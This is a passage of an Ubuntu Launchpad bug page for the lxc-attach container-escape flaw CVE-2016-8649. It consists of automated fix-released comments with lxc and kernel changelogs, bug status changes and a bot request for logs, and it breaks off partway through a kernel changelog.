          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/56"> #56</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug was fixed in the package lxc - 1.1.5-0ubuntu0.<wbr />15.04.4</p>
<p>---------------<br />
lxc (1.1.5-<wbr />0ubuntu0.<wbr />15.04.4) vivid-security; urgency=medium</p>
<p>&nbsp;&nbsp;* SECURITY UPDATE: Escape through ptrace and inherited fd (LP: <a href="/bugs/1639345" class="bug-link">#1639345</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- attach: Do not send procfd to attached process<br />
&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2016-8649</p>
<p>&nbsp;-- Stéphane Graber &lt;email address hidden&gt;  Tue, 22 Nov 2016 00:49:00 -0500</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This bug was fixed in the package lxc - 1.1.5-0ubuntu0.15.04.4

---------------
lxc (1.1.5-0ubuntu0.15.04.4) vivid-security; urgency=medium

  * SECURITY UPDATE: Escape through ptrace and inherited fd (LP: #1639345)
    - attach: Do not send procfd to attached process
    - CVE-2016-8649

 -- Stéphane Graber &lt;stgraber@ubuntu.com&gt;  Tue, 22 Nov 2016 00:49:00 -0500</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in lxc (Ubuntu Vivid): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Fix Released
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/57" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~janitor" class="sprite person-inactive">Launchpad Janitor (janitor)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-23T16:13:42.594136+00:00" title="2016-11-23 16:13:42 UTC">on 2016-11-23</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/57"> #57</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug was fixed in the package lxc - 2.0.5-0ubuntu1~<wbr />ubuntu16.<wbr />04.3</p>
<p>---------------<br />
lxc (2.0.5-<wbr />0ubuntu1~<wbr />ubuntu16.<wbr />04.3) xenial-security; urgency=medium</p>
<p>&nbsp;&nbsp;* SECURITY UPDATE: Escape through ptrace and inherited fd (LP: <a href="/bugs/1639345" class="bug-link">#1639345</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- attach: Do not send procfd to attached process<br />
&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2016-8649</p>
<p>&nbsp;-- Stéphane Graber &lt;email address hidden&gt;  Tue, 22 Nov 2016 00:49:00 -0500</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This bug was fixed in the package lxc - 2.0.5-0ubuntu1~ubuntu16.04.3

---------------
lxc (2.0.5-0ubuntu1~ubuntu16.04.3) xenial-security; urgency=medium

  * SECURITY UPDATE: Escape through ptrace and inherited fd (LP: #1639345)
    - attach: Do not send procfd to attached process
    - CVE-2016-8649

 -- Stéphane Graber &lt;stgraber@ubuntu.com&gt;  Tue, 22 Nov 2016 00:49:00 -0500</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in lxc (Ubuntu Xenial): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Fix Released
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/58" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~janitor" class="sprite person-inactive">Launchpad Janitor (janitor)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-23T16:17:16.093820+00:00" title="2016-11-23 16:17:16 UTC">on 2016-11-23</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/58"> #58</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug was fixed in the package lxc - 2.0.5-0ubuntu4</p>
<p>---------------<br />
lxc (2.0.5-0ubuntu4) zesty-security; urgency=medium</p>
<p>&nbsp;&nbsp;* SECURITY UPDATE: Escape through ptrace and inherited fd (LP: <a href="/bugs/1639345" class="bug-link">#1639345</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- attach: Do not send procfd to attached process<br />
&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2016-8649</p>
<p>&nbsp;-- Stéphane Graber &lt;email address hidden&gt;  Tue, 22 Nov 2016 00:49:00 -0500</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This bug was fixed in the package lxc - 2.0.5-0ubuntu4

---------------
lxc (2.0.5-0ubuntu4) zesty-security; urgency=medium

  * SECURITY UPDATE: Escape through ptrace and inherited fd (LP: #1639345)
    - attach: Do not send procfd to attached process
    - CVE-2016-8649

 -- Stéphane Graber &lt;stgraber@ubuntu.com&gt;  Tue, 22 Nov 2016 00:49:00 -0500</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in lxc (Ubuntu): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Triaged &#8594; Fix Released
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
    
    <time title="2016-11-23 16:34:17 UTC" datetime="2016-11-23T16:34:17.728525+00:00">on 2016-11-23</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>information type</b>:
      </td>
      <td>
        Private Security &#8594; Public Security
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/59" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~brad-figg" class="sprite person">Brad Figg (brad-figg)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-23T17:00:13.491526+00:00" title="2016-11-23 17:00:13 UTC">on 2016-11-23</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/ubuntu/+source/lxc/+bug/1639345/comments/59">
                <strong>Missing required logs.</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/59"> #59</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug is missing log files that will aid in diagnosing the problem. From a terminal window please run:</p>
<p>apport-collect 1639345</p>
<p>and then change the status of the bug to &#x27;Confirmed&#x27;.</p>
<p>If, due to the nature of the issue you have encountered, you are unable to run this command, please add a comment stating that fact and change the bug status to &#x27;Confirmed&#x27;.</p>
<p>This change has been made by an automated script, maintained by the Ubuntu Kernel Team.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This bug is missing log files that will aid in diagnosing the problem. From a terminal window please run:

apport-collect 1639345

and then change the status of the bug to 'Confirmed'.

If, due to the nature of the issue you have encountered, you are unable to run this command, please add a comment stating that fact and change the bug status to 'Confirmed'.

This change has been made by an automated script, maintained by the Ubuntu Kernel Team.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in linux (Ubuntu): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Incomplete
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~stgraber" class="sprite person">Stéphane Graber (stgraber)</a>
    
    <time title="2016-11-23 17:14:25 UTC" datetime="2016-11-23T17:14:25.883943+00:00">on 2016-11-23</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in linux (Ubuntu): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Incomplete &#8594; New
      </td>
    </tr>
  
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>tags</b>:
      </td>
      <td>
        added: bot-stop-nagging
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~brad-figg" class="sprite person">Brad Figg (brad-figg)</a>
    
    <time title="2016-11-23 17:31:04 UTC" datetime="2016-11-23T17:31:04.400986+00:00">on 2016-11-23</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in linux (Ubuntu): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Incomplete
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~stgraber" class="sprite person">Stéphane Graber (stgraber)</a>
    
    <time title="2016-11-23 17:58:10 UTC" datetime="2016-11-23T17:58:10.196265+00:00">on 2016-11-23</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in linux (Ubuntu): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Incomplete &#8594; Triaged
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/61" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~vorlon" class="sprite person">Steve Langasek (vorlon)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-30T01:45:51.645500+00:00" title="2016-11-30 01:45:51 UTC">on 2016-11-30</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/ubuntu/+source/lxc/+bug/1639345/comments/61">
                <strong>Update Released</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/61"> #61</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>The verification of the Stable Release Update for linux-lts-trusty has completed successfully and the package has now been released to -updates.  Subsequently, the Ubuntu Stable Release Updates Team is being unsubscribed and will not receive messages about this bug report.  In the event that you encounter a regression using the package from -updates please report a new bug using ubuntu-bug and tag the bug report regression-update so we can easily find any regressions.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">The verification of the Stable Release Update for linux-lts-trusty has completed successfully and the package has now been released to -updates.  Subsequently, the Ubuntu Stable Release Updates Team is being unsubscribed and will not receive messages about this bug report.  In the event that you encounter a regression using the package from -updates please report a new bug using ubuntu-bug and tag the bug report regression-update so we can easily find any regressions.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/62" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~janitor" class="sprite person-inactive">Launchpad Janitor (janitor)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-30T01:49:25.065052+00:00" title="2016-11-30 01:49:25 UTC">on 2016-11-30</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/62"> #62</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug was fixed in the package linux - 3.13.0-103.150</p>
<p>---------------<br />
linux (3.13.0-103.150) trusty; urgency=low</p>
<p>&nbsp;&nbsp;[ Luis Henriques ]</p>
<p>&nbsp;&nbsp;* Release Tracking Bug<br />
&nbsp;&nbsp;&nbsp;&nbsp;- LP: <a href="/bugs/1644489" class="bug-link">#1644489</a></p>
<p>&nbsp;&nbsp;* Possible regression on 3.13.0-<wbr />102.149~<wbr />precise1 x86_64 (gce) (LP: <a href="/bugs/1644302" class="bug-link">#1644302</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- SAUCE: apparmor: delete extra variable dev_path</p>
<p>linux (3.13.0-102.149) trusty; urgency=low</p>
<p>&nbsp;&nbsp;[ Luis Henriques ]</p>
<p>&nbsp;&nbsp;* Release Tracking Bug<br />
&nbsp;&nbsp;&nbsp;&nbsp;- LP: <a href="/bugs/1640581" class="bug-link">#1640581</a></p>
<p>&nbsp;&nbsp;* lxc-attach to malicious container allows access to host (LP: <a href="/bugs/1639345" class="bug-link">#1639345</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- Revert &quot;UBUNTU: ptrace: being capable wrt a process requires mapped<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uids/gids&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;- (upstream) mm: Add a user_ns owner to mm_struct and fix ptrace permission<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;checks</p>
<p>&nbsp;&nbsp;* Syntax error extra parenthesis linux-headers-<wbr />3.13.0-<wbr />100/Makefile<br />
&nbsp;&nbsp;&nbsp;&nbsp;(LP: <a href="/bugs/1636625" class="bug-link">#1636625</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- Makefile: fix extra parenthesis typo when CC_STACKPROTECT<wbr />OR_REGULAR is<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;enabled</p>
<p>&nbsp;&nbsp;* Add a driver for Amazon Elastic Network Adapters (ENA) (LP: <a href="/bugs/1635721" class="bug-link">#1635721</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- lib/bitmap.c: conversion routines to/from u32 array<br />
&nbsp;&nbsp;&nbsp;&nbsp;- kernel.h: define u8, s8, u32, etc. limits<br />
&nbsp;&nbsp;&nbsp;&nbsp;- net: ethtool: add new ETHTOOL_<wbr />xLINKSETTINGS API<br />
&nbsp;&nbsp;&nbsp;&nbsp;- PCI/MSI: Add pci_msix_<wbr />vec_count(<wbr />)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- etherdevice: Use ether_addr_copy to copy an Ethernet address<br />
&nbsp;&nbsp;&nbsp;&nbsp;- net: ena: Add a driver for Amazon Elastic Network Adapters (ENA)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- [config] enable CONFIG_<wbr />ENA_ETHERNET=<wbr />m (Amazon ENA driver)</p>
<p>&nbsp;&nbsp;* CVE-2016-8658<br />
&nbsp;&nbsp;&nbsp;&nbsp;- brcmfmac: avoid potential stack overflow in brcmf_cfg80211_<wbr />start_ap(<wbr />)</p>
<p>&nbsp;&nbsp;* CVE-2016-7425<br />
&nbsp;&nbsp;&nbsp;&nbsp;- scsi: arcmsr: Buffer overflow in arcmsr_<wbr />iop_message_<wbr />xfer()</p>
<p>&nbsp;&nbsp;* srcname from mount rule corrupted under load (LP: <a href="/bugs/1634753" class="bug-link">#1634753</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- SAUCE: apparmor: fix sleep in critical section</p>
<p>&nbsp;&nbsp;* ghash-clmulni-intel module fails to load (LP: <a href="/bugs/1633058" class="bug-link">#1633058</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- crypto: ghash-clmulni - Fix load failure<br />
&nbsp;&nbsp;&nbsp;&nbsp;- crypto: cryptd - Assign statesize properly</p>
<p>&nbsp;-- Luis Henriques &lt;email address hidden&gt;  Thu, 24 Nov 2016 09:56:54 +0000</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This bug was fixed in the package linux - 3.13.0-103.150

---------------
linux (3.13.0-103.150) trusty; urgency=low

  [ Luis Henriques ]

  * Release Tracking Bug
    - LP: #1644489

  * Possible regression on 3.13.0-102.149~precise1 x86_64 (gce) (LP: #1644302)
    - SAUCE: apparmor: delete extra variable dev_path

linux (3.13.0-102.149) trusty; urgency=low

  [ Luis Henriques ]

  * Release Tracking Bug
    - LP: #1640581

  * lxc-attach to malicious container allows access to host (LP: #1639345)
    - Revert "UBUNTU: ptrace: being capable wrt a process requires mapped
      uids/gids"
    - (upstream) mm: Add a user_ns owner to mm_struct and fix ptrace permission
      checks

  * Syntax error extra parenthesis linux-headers-3.13.0-100/Makefile
    (LP: #1636625)
    - Makefile: fix extra parenthesis typo when CC_STACKPROTECTOR_REGULAR is
      enabled

  * Add a driver for Amazon Elastic Network Adapters (ENA) (LP: #1635721)
    - lib/bitmap.c: conversion routines to/from u32 array
    - kernel.h: define u8, s8, u32, etc. limits
    - net: ethtool: add new ETHTOOL_xLINKSETTINGS API
    - PCI/MSI: Add pci_msix_vec_count()
    - etherdevice: Use ether_addr_copy to copy an Ethernet address
    - net: ena: Add a driver for Amazon Elastic Network Adapters (ENA)
    - [config] enable CONFIG_ENA_ETHERNET=m (Amazon ENA driver)

  * CVE-2016-8658
    - brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()

  * CVE-2016-7425
    - scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()

  * srcname from mount rule corrupted under load (LP: #1634753)
    - SAUCE: apparmor: fix sleep in critical section

  * ghash-clmulni-intel module fails to load (LP: #1633058)
    - crypto: ghash-clmulni - Fix load failure
    - crypto: cryptd - Assign statesize properly

 -- Luis Henriques &lt;luis.henriques@canonical.com&gt;  Thu, 24 Nov 2016 09:56:54 +0000</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in linux (Ubuntu Trusty): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Fix Committed &#8594; Fix Released
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/63" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~janitor" class="sprite person-inactive">Launchpad Janitor (janitor)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-30T01:57:27.998904+00:00" title="2016-11-30 01:57:27 UTC">on 2016-11-30</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/63"> #63</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug was fixed in the package linux - 3.19.0-75.83</p>
<p>---------------<br />
linux (3.19.0-75.83) vivid; urgency=low</p>
<p>&nbsp;&nbsp;[ Luis Henriques ]</p>
<p>&nbsp;&nbsp;* Release Tracking Bug<br />
&nbsp;&nbsp;&nbsp;&nbsp;- LP: <a href="/bugs/1640613" class="bug-link">#1640613</a></p>
<p>&nbsp;&nbsp;* lxc-attach to malicious container allows access to host (LP: <a href="/bugs/1639345" class="bug-link">#1639345</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- Revert &quot;UBUNTU: ptrace: being capable wrt a process requires mapped<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uids/gids&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;- (upstream) mm: Add a user_ns owner to mm_struct and fix ptrace permission<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;checks</p>
<p>&nbsp;&nbsp;* CVE-2016-8658<br />
&nbsp;&nbsp;&nbsp;&nbsp;- brcmfmac: avoid potential stack overflow in brcmf_cfg80211_<wbr />start_ap(<wbr />)</p>
<p>&nbsp;&nbsp;* CVE-2016-7425<br />
&nbsp;&nbsp;&nbsp;&nbsp;- scsi: arcmsr: Buffer overflow in arcmsr_<wbr />iop_message_<wbr />xfer()</p>
<p>&nbsp;-- Luis Henriques &lt;email address hidden&gt;  Wed, 09 Nov 2016 22:48:56 +0000</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This bug was fixed in the package linux - 3.19.0-75.83

---------------
linux (3.19.0-75.83) vivid; urgency=low

  [ Luis Henriques ]

  * Release Tracking Bug
    - LP: #1640613

  * lxc-attach to malicious container allows access to host (LP: #1639345)
    - Revert "UBUNTU: ptrace: being capable wrt a process requires mapped
      uids/gids"
    - (upstream) mm: Add a user_ns owner to mm_struct and fix ptrace permission
      checks

  * CVE-2016-8658
    - brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()

  * CVE-2016-7425
    - scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()

 -- Luis Henriques &lt;luis.henriques@canonical.com&gt;  Wed, 09 Nov 2016 22:48:56 +0000</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in linux (Ubuntu Vivid): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Fix Committed &#8594; Fix Released
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/64" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~janitor" class="sprite person-inactive">Launchpad Janitor (janitor)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-30T01:58:35.460386+00:00" title="2016-11-30 01:58:35 UTC">on 2016-11-30</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/64"> #64</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  <a href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/comments/64/+download">Download full text</a> (22.5 KiB)
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug was fixed in the package linux - 4.4.0-51.72</p>
<p>---------------<br />
linux (4.4.0-51.72) xenial; urgency=low</p>
<p>&nbsp;&nbsp;[ Luis Henriques ]</p>
<p>&nbsp;&nbsp;* Release Tracking Bug<br />
&nbsp;&nbsp;&nbsp;&nbsp;- LP: <a href="/bugs/1644611" class="bug-link">#1644611</a></p>
<p>&nbsp;&nbsp;* 4.4.0-1037-<wbr />snapdragon #41: kernel panic on boot (LP: <a href="/bugs/1644596" class="bug-link">#1644596</a>)<br />
